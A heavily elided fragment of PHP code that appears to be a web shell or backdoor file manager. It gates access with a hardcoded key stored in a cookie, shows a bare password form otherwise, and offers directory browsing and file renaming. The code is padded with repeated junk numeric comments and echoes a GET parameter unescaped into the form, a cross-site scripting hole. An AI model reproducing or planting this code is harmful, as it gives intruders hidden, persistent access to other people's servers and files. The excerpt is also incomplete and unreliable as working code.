...
$auth_key = "f20dc23d93ad0225854dfc998ed13a35";
...
$pass = false;
if (isset($_COOKIE['pw_name_49316'])) {
    if(($_COOKIE['pw_name_49316']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_49316'])) {
        if(($_POST['pw_name_49316']) == $auth_key) {
            setcookie("pw_name_49316", $_POST['pw_name_49316']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_49316' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728190053554682 1728190053354494 1728190053558530 1728190053124991
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728190053554682 1728190053354494 1728190053558530 1728190053124991
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728190053554682 1728190053354494 1728190053558530 1728190053124991
            $name = PATH . "/" . $_GET['r'];
